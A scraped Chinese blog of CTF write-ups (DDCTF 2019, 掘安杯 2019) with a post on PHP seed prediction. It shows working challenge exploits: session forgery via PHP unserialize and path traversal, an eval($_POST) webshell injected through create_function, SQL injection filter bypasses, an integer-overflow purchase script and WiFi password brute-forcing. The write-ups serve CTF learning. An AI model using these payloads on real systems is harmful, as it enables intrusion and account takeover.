$data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) { parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;); return FALSE; } if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) { parent::response(&#39;the user agent not match&#39;,&#39;error&#39;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &#39;&#39;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)), &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;], &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;user_data&#39; =&gt; &#39;&#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); 其中发现了已一些危险函数unserialize，以及file_get_contents等等 这里存在类的反序列化应用 猜测flag可能藏在../config/key.txt里面 大概知道题目的大概流程为： 通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); 细看代码，发现签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点 eancrykey存放目录为../config/key.txt。 由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。 某处代码中的调用 本地测试了一下 sprintf函数 &lt;?php $data=&quot;Welcome my friend %s&quot;; $arr=array(&#39;chuddy&#39;,&#39;chuddy123&#39;); foreach ($arr as $value) { echo sprintf($data,$value).&quot;&lt;br&gt;&quot;; } ?&gt; 输出结果为： Welcome my friend chuddy Welcome my friend chuddy123 于是想到构造方法：nickname=%s就可以得到eancrykey的值 然后就是伪造一个session值： private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } 发现这个path值 过滤了../可以进行双写绕过 于是构造Application类 &lt;?php class Application{ var $session_id = &#39;5c5d2e08abcb1f7f32228b19935a9fb5&#39;; var $ip_address = &#39;117.158.83.66&#39;; var $user_agent = &#39;Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:66.0)+Gecko/20100101+Firefox/66.0&#39;; var $user_data = &#39;&#39;; var $path = &#39;....//config/flag.txt&#39;; } $a = new Application(); $a = serialize($a); echo urlencode($a.md5(&#39;EzblrbNS&#39;.$a)); ?&gt; 得到flag DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j} Upload-IMG打开页面发现是一个文件上传的题目 先随便传一个图片看一下 发现这个是需要经过二次渲染之后 还能找到 phpinfo() 这一串字符串 让我想到了 以前做过的 upload-labs的第十六关 二次渲染绕过 参考了当时讲课的时候的学长的博客 于是开始制作一个 能过绕过二次渲染的图片 首先保存一个 已经被渲染的图片 命名为 1.jpg 然后用脚本开始跑图片其中关键字改为phpinfo()就可以了 php phpinfo.php 1.jpg 制作完成一张 合格的图片 然后上传 就会得到flag： 大吉大利，今晚吃鸡打开页面是一个 类似吃鸡模式的游戏 首先获得入场券，然后淘汰其他选手就能获得flag 首先购买入场券 通过抓包发现ticket_price=2000这个参数可以进行修改，但是只能改大不能改小，于是想到了php的整形溢出 令ticket_price=4294967296 就可以买到入场券 进入游戏 然后想到了利用python写脚本注册大量的用户 然后再把它们移除 脚本为： import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) id = open(&quot;1.txt&quot;, &quot;a&quot;) ticket = open(&quot;2.txt&quot;,&quot;a&quot;) for i in range(150): register_url = &quot;http://117.51.147.155:5050/ctf/api/register&quot; r = requests.session() register_playload = &quot;?name=chuddy1234chuddy123chuddy123chuddy123chuddy123&quot;+str(i)+&quot;&amp;password=123456789a&quot; # print register_playload s = r.get(url=register_url+register_playload) # print s.text tick_url = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot; tick = r.get(url=tick_url) a = tick.text bill_id = re.search(r&#39;id&quot;:&quot;(.*)&quot;,&quot;tick&#39;,a).group(1) # print bill_id pay_url = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+bill_id pay = r.get(url=pay_url) success = &#39;{&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:75,&quot;your_ticket&quot;:&quot;4c529f4afa586f5d8e1e8bd89a6f28dd&quot;}],&quot;msg&quot;:&quot;\\u4ea4\\u6613\\u6210\\u529f&quot;}&#39; pay_id1 = re.search(r&#39;your_id&quot;:(.*),&quot;you&#39;,pay.text).group(1) pay_ticket1 = re.search(r&#39;your_ticket&quot;:&quot;(.*)&quot;}],&quot;msg&quot;&#39;,pay.text).group(1) print pay_id1 print pay_ticket1 id.write(pay_id1) id.write(&quot;\\n&quot;) ticket.write(pay_ticket1) ticket.write(&quot;\\n&quot;) 这个可以获得大量的注册的用户，再用bp跑一下 将他们清除掉就可以获得flag了 跑完脚本就能得到flag了 flag: DDCTF{chiken_dinner_hyMCX[n47Fx)}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"php伪随机数","slug":"php伪随机数","date":"2019-04-20T08:18:10.000Z","updated":"2019-05-29T12:42:29.996Z","comments":true,"path":"2019/04/20/php伪随机数/","link":"","permalink":"http://yoursite.com/2019/04/20/php伪随机数/","excerpt":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来","text":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来 php伪随机数漏洞php中重要的几个随机函数 rand() 不指定参数时，范围0-32767 md_rand() 不指定参数时，范围0-2^32-1 srand() 给rand()函数播种 mt_srand() 给mt_srand()函数播种 php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样 自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 所以，当种子一定时，接下来几次的随机数都是固定的 测试代码： &lt;?php mt_srand(1433223); echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; ?&gt; 页面输出： 2068220702 2001673607 410303409 475448501 1250041484 发现随机种子 确定下来 无论怎么刷新 页面返回的一直是这几个随机数 同时我们应该注意，mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。 工具链接： php伪随机数 发现爆出了5个可能的种子通过验证可以知道那个是正确的种子 注意：如果不是第一次生成的随机数，爆出来的种子，不一定正确 在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019掘安杯writeup","slug":"掘安杯writeup","date":"2019-04-10T08:05:29.172Z","updated":"2019-05-29T12:33:09.884Z","comments":true,"path":"2019/04/10/掘安杯writeup/","link":"","permalink":"http://yoursite.com/2019/04/10/掘安杯writeup/","excerpt":"2019掘安杯writeupweb","text":"2019掘安杯writeupweb web签到题打开题目链接发现 点击之后是一个404页面 果断选择抓包 发现： 感觉像是base64编码 于是解码获得flag： jactf{jasafe110qweasdzxc} 下载下载打开链接发现下载了一个flag.txt 于是开始思考别的 查看源代码发现 &lt;html&gt; &lt;head&gt; &lt;title&gt;下载下载&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt; &lt;!-- &lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt; --&gt; &lt;/body&gt; &lt;/html&gt; 于是尝试下载flag.php http://120.79.1.69:10002/?file=flag.php flag.php的内容为一种加密解密的方式 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码 function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i &lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i &lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=&quot;MyCTF&quot;; $flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key) ?&gt; 只需在代码下面添加 echo decrypt($flag,$key); 运行就可以得到flag myCTF{cssohw456954GUEB} 猜密码题目暂时下架了 该网站已被黑打开页面发现网站被黑 于是用御剑扫到后门 shell.php 开始爆破管理员密码为 hack即可得到flag jactf{DWDASFASCASFAFASFNKAS} not_easy发现是个代码审计类的题目： &lt;?php error_reporting(0); if(isset($_GET[&#39;action&#39;])) { $action = $_GET[&#39;action&#39;]; } if(isset($_GET[&#39;action&#39;])){ $arg = $_GET[&#39;arg&#39;]; } if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)){ show_source(__FILE__); } else { $action($arg,&#39;&#39;); } 想到了匿名函数绕过 但是他这里有一个正则匹配的问题 看了别人的blog才知道 \\可以绕过这个 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 于是想到绕过方式： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}phpinfo();/* 于是可以构造一个木马： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}eval($_POST[&#39;chuddy&#39;]);/* 就可以得到flag： jactf{c795359da56ae38ec9132eaad24733fc} 曲折的人生打开页面发现了登陆框 发现可以联合注入 通过测试发现过滤了： 空格：用/*1*/绕过 union：双写绕过ununionion select: 双写绕过selselctect or：双写绕过oorr 于是开始爆值： 爆出username：goodboy_g-60Hellowor 登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过 admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&#39;# 爆出password为 ajahas&amp;&amp;*44askldajaj admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&#39;# 接下来就是下面验证码的问题 需要用脚本来跑 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data={ &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39; } for i in range(100000000): s = requests.Session() url=&quot;http://120.79.1.69:10005/index.php&quot; r = s.post(url=url,data=data) match = re.search(r&quot;&lt;div class=&#39;rep&#39;&gt;.*&lt;/div&gt;&quot;,r.text).group(0) match = str(match) match = re.sub(&quot;&lt;div class=&#39;rep&#39;&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;&lt;/div&gt; &lt;/div&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;（&quot;,&#39;(&#39;,match) match = re.sub(&quot;）X&quot;,&#39;)*&#39;,match) match = re.sub(&quot;）/&quot;,&#39;)/&#39;,match) match = re.sub(&quot;）&quot;,&#39;)&#39;,match) match = eval(match) print match d = { &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39;, &quot;code&quot;: match } r = s.post(url=url+&quot;?check&quot;,data=d) if &quot;验证码正确&quot; in r.text: print r.text break 跑出来了一个压缩包地址 和密码： 这里面有获取flag.zip的密码获取方式 Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot; End If End Sub 写出解密脚本： str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot; print len(str) flag = &quot;&quot; flag1 = &quot;&quot; i =1 while i &lt;= len(str): flag += str[i-1:i] i = i + (i%5) i=1 while i &lt;= len(flag): flag1 += flag[i-1:i] i = i + (i%5) print flag1 密码为：VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 解压缩flag.zip之后发现图片打不开，用winhex打开发现flag flag{Good luck!} audit发现是代码审计 &lt;?php highlight_file(__FILE__); include(&#39;flag.php&#39;); $str1 = @$_GET[&#39;str1&#39;]; $str2 = @$_GET[&#39;str2&#39;]; $str3 = @$_GET[&#39;str3&#39;]; $str4 = @$_GET[&#39;str4&#39;]; $str5 = (string)@$_POST[&#39;str5&#39;]; $str6 = (string)@$_POST[&#39;str6&#39;]; $str7 = (string)@$_POST[&#39;str7&#39;]; if( $str1 == $str2 ){ die(&#39;str1 OR Sstr2 no no no&#39;); } if( md5($str1) != md5($str2) ){ die(&#39;step 1 fail&#39;); } if( $str3 == $str4 ){ die(&#39;str3 OR str4 no no no&#39;); } if ( md5($str3) !== md5($str4)){ die(&#39;step 2 fail&#39;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(&#39;str5 OR str6 OR str7 no no no&#39;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(&#39;step 3 fail&#39;); } if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;])) { echo &quot;come on!&quot;; die(); } $a = $_POST[&#39;a&#39;]; $b = $_POST[&#39;b&#39;]; $m = $_GET[&#39;m&#39;]; $n = $_GET[&#39;n&#39;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo &quot;a OR b fail!&quot;; die(); } if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo &quot;m OR n fail&quot;; die(); } $str8 = hash(&#39;md5&#39;, $a, false); $str9 = strtr(hash(&#39;md5&#39;, $b, false), $m, $n); echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;; if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) { echo &quot;You&#39;re great,give you flag:&quot;; echo $flag; } str1 OR Sstr2 no no no 第一步就是利用弱类型绕过。 第二步就是数组绕过。 str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过 但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了只能用MD5强碰撞 str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() 工具地址为：https://github.com/thereal1024/python-md5-collision 然后就是最后一层的了 需要传递四个参数a,b,m,n$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,要求$str8== $str9。还是用的弱类型。a可以为：QNKCDZO如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。 然后开始构造：脚本为： import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot; str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() data= { &#39;str5&#39;:str5, &#39;str6&#39;:str6, &#39;str7&#39;:str7, &#39;a&#39;:&#39;QNKCDZO&#39;, &#39;b&#39;:&#39;259987&#39; } s = requests.post(url=url,data=data) print s.text 得到flag： jactf{c795359da56ae38ec9132eaad24733fc} miscmisc签到关注公众号 获得flag jactf{051bb6f64e70cc8766d62c3ea008eaee} so_easy下载下来发现是个打不开的exe文件 于是放在winhex下 发现有点像base加密尝试了一下发现是base58加密 进行解密发现了像是图片转的base64 data:image/bmp;base64, 于是进行在线解密扫描二维码就能得到flag jactf{base58_base64_flag_very_easy} 这是什么玩意打开txt文件发现是一些有规律的字符串 =E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6 百度一波发现是 Quoted-printable编码 开始解码 解码获得一个佛曰 于是想到了 与佛论禅 社会主义核心价值观编码 解码获得flag flag为： jactf{hexin_yufo_qp} 你对我的网站做了什么这是一个流量包分析题，打开流量包直接追踪数据流 发现了php代码 关于一种加密方式 还有一个和flag有关的数据流 分析可知是通过对flag.txt的内容进行加密 绕后输出的 于是写出解密的方法 &lt;?php $str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;; echo gzuncompress(base64_decode($str, 6)); ?&gt; 得到flag： flag{U_f1nd_Me!} 小梳子题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。 首先使用kali工具生成我们想要的字典 crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt 解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径 然后开始爆破这个wifi aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap 输入对应的编号：1，然后就是开始爆破 得到flag： jactf{13836458932} 这不是真的图片打开是一个图片 分析无果 binwalk一下 发现里面有一个压缩包 但是foremost却不能分离出来 winhex打开文件 查找 14000000 发现压缩包的头 被改为了 ja66 改回之后 再进行分离 打开压缩包 发现需要输入密码 尝试ja66 打开了 发现好多个文件夹 每个文件夹里面都有一个字母 有这些字母组成flag 编写脚本 import base64 flag=&#39;&#39; for i in range(32): f=open(&#39;./subject/&#39;+str(i)+&#39;/&#39;+str(i)+&#39;.txt&#39;,&#39;r&#39;) flag+=f.read() print flag print base64.b64decode(flag) 得到flag： jactf{64se64_1s_50_c001} 该死的温柔这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。 安装工具kali终端命令： git clone https://github.com/crorvick/outguess 下载之后双击打开文件夹 输入命令 ./configure&amp;&amp; make &amp;&amp; make install 即可安装成功 查看这个图片的属性，发现备注有个guess 这就是要工具解密的密码然后构造命令 root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txt Reading flag.jpg.... Extracting usable bits: 11538 bits Steg retrieve: seed: 206, len: 33 得到flag jactf{jactf_guess_steganography} 怀疑人生打开发现是三个文件 第一个文件是一个压缩包 需要密码才能打开 于是想到用工具去跑 跑出来密码为 password 打开发现时一串字母 用base64解码得到第一部分的flag flag{hacker 第二个文件是一个图片使用binwalk分析这个图片 发现隐藏的压缩包 foremost分离 打开压缩包 发现需要密码 用winhex打开发现时压缩包伪加密 把全局伪加密 01 00 ，改为00 00后保存 解压得到了一个txt文件 打开后发现是有 .?!组成的 想到了ook解密 ook解密 解密获得字符串 3oD54e 用base58解密获得第二部分的flag misc 第三个文件像是一个二维码 使用二维码识别工具进行识别 得到最后一部分的flag 12580} 三部分拼接在一起结构成了flag flag{hackermisc12580} CRYPTO签到题发现了一串字符串 像十六进制 #coding:utf-8 import binascii str = &quot;6A616374667B6865785F69735F656173797D&quot; print binascii.a2b_hex(str) 得到flag jactf{hex_is_easy} 罗马帝国的奠基者给了一些奇怪的字符串 h^_o`[pZi^i` 这和jactf前五个字符的ascii码值相差2，3，4，5，6 编写脚本 str = &quot;h^_o`[pZi^i`&quot; flag = &quot;&quot; c=2 for i in range(len(str)): flag += chr(ord(str[i])+c) c=c+1 print flag 得到flag： jactf{bxcsium} 贝斯家族三英战群魔看到这个题目就这到和basae解码有关 打开txt文件是一长串的字符串 对其进行base16，base32，base64循环解码 就能得到flag jactf{4(b64_32_16)} 绝密文件打开文件 作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下： 